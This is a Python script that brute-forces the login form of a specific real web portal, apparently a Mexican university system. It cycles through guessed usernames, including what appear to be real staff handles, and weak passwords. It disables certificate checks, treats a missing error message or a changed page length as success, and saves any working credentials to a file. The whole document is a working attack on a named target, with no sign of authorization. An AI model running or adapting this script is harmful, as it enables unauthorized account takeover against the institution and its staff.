#!/usr/bin/env python3
import requests

target = "https://sito.utslp.edu.mx/"

# Basado en patrones UTSLP y información del certificado
users = ["hnieto", "harriaga", "admin", "administrador", "sito", "utslp", 
         "rector", "director", "coordinador", "jefe", "sysadmin"]

passwords = ["utslp", "Utslp2024", "UTSLP2024", "Utslp2023", "utslp2023",
             "Password1", "Admin123", "Welcome1", "Changeme1", "P@ssw0rd",
             "hnieto", "harriaga", "admin", "123456", "password"]

def try_login(user, password):
    data = {
        "yAccion": "Iniciar_Sesion",
        "yIntentos": "1", 
        "yUsuario": user,
        "xUsuario": user,
        "xContrasena": password
    }
    
    try:
        response = requests.post(target, data=data, verify=False, timeout=10)
        
        # El virtual host correcto muestra mensaje de error cuando falla
        if "incorrectos" not in response.text:
            return True, response
        if len(response.text) != 16036:  # Longitud diferente del error estándar
            return True, response
            
    except Exception as e:
        print(f"Error: {e}")
    
    return False, None

print("[+] Fuerza bruta contextual UTSLP...")
for user in users:
    for password in passwords:
        print(f"Probando: {user}:{password}")
        success, response = try_login(user, password)
        if success:
            print(f"\n[¡ÉXITO!] Credenciales válidas: {user}:{password}")
            print(f"Status: {response.status_code}")
            with open("credenciales_utslp.txt", "w") as f:
                f.write(f"{user}:{password}")
            exit(0)

print("\n[-] No se encontraron credenciales en esta ronda")